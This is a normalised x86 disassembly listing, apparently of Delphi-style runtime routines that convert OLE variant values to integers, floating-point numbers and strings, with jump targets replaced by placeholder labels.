mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411274
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4113d0
fstp [ esp ]
fwait
jmp r-xdata
sub_411720
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4117cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412714
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_404174
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_40947c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4117d3
lea eax [ ebp - 0x10 ]
call sub_403eec
lea eax [ ebp - 0xc ]
call sub_4045cc
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40e930
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40e930
jmp r-xdata
sub_4117dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40e930
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41183c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40e930
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411888
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4118dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40effc
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411938
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4118e4
lea eax [ ebp - 0x18 ]
call sub_40ecd4
retn
sub_4118ec
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4141e8
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411938
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411954 ]
mov eax ebx
call sub_411720
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41183c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_41183c
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411720
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4117dc
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411938
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41183c
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411888
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e49c
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4118ec
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_41183c
fistp [ esp ]
fwait
mov eax ebx
call sub_41183c
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411b59 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41183c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_41183c
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411720
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4117dc
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411938
fistp [ esp ]
fwait
jmp r-xdata
sub_411d04
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4045cc
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e930
pop ebx
pop ebp
retn 0x8
sub_411d3c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4045cc
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e930
pop ebx
pop ebp
retn 0x8
sub_411d74
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_411e2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4045cc
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e930
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411e31
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f10
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404174
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407cd4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404718
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404174
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407c98
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404718
jmp r-xdata
jmp r-xdata
call sub_40e538
sub_411e38
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_411ef7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411ed5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e930
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4046dc
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411edc
lea eax [ ebp - 0x10 ]
call sub_40ecd4
retn
sub_411f04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411f5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40effc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_411fec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411f61
lea eax [ ebp - 0x10 ]
call sub_40ecd4
retn
sub_411f68
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4141e8
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411fdd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ecd4
retn
sub_411fec
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412523
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412025 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f40
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403eec
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407f80
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403f40
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407f80
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403f40
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4093a8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f40
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4093a8
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403f40
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411d04
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404174
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411d3c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404174
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4046dc
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c8
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404174
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_411d74
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404174
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407f80
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403f40
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407f80
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403f40
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407f80
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403f40
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_40806c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403f40
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_40806c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403f40
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_411fec
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_411e38
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403f40
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41252a
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403f10
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4045e4
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403f10
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4045e4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f10
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_411f04
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403f40
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403f40
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e49c
test ah 0x40
je r-xdata
mov eax esi
call sub_403eec
mov edx eax
mov eax ebx
call sub_411f68
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_411e38
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403f40
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_411e38
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403f40
jmp r-xdata
jmp [ eax * 4 + jump_table_4122b9 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f80
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403f40
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407f80
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403f40
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4093a8
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403f40
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4093a8
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403f40
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411d04
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404174
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_411d3c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404174
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404114
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411d74
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404174
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f80
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403f40
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f80
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403f40
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f80
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403f40
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_40806c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403f40
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_40806c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403f40
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_411fec
jmp r-xdata
sub_412530
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4125da
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4125bd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e930
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4046dc
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4125c4
lea eax [ ebp - 0x10 ]
call sub_40ecd4
retn
sub_4125e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41263e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40effc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412714
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412645
lea eax [ ebp - 0x10 ]
call sub_40ecd4
retn
sub_41264c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412704
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4141e8
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41270b
lea eax [ ebp - 0x20 ]
call sub_4045cc
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4126e7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4046dc
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ecd4
retn
sub_412714
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412c66
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41274e ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404718
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4045cc
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407f80
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404718
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407f80
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404718
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4093a8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404718
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4093a8
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404718
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411d04
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404608
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411d3c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404608
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4046dc
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c8
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_411d74
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404608
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407f80
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404718
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407f80
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404718
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407f80
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404718
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_40806c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404718
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_40806c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404718
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412714
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412530
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404608
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c6d
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4045e4
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403f10
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4045e4
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403f10
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4045e4
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403f10
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4045e4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f10
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4125e8
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404608
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404718
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e49c
test ah 0x40
je r-xdata
mov eax esi
call sub_4045cc
mov edx eax
mov eax ebx
call sub_41264c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412530
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404608
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412530
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404608
jmp r-xdata
jmp [ eax * 4 + jump_table_4129d5 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f80
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404718
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407f80
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404718
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4093a8
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404718
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4093a8
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404718
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_411d04
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404608
jmp r-xdata
mov eax [ ebx + 0x8 ]
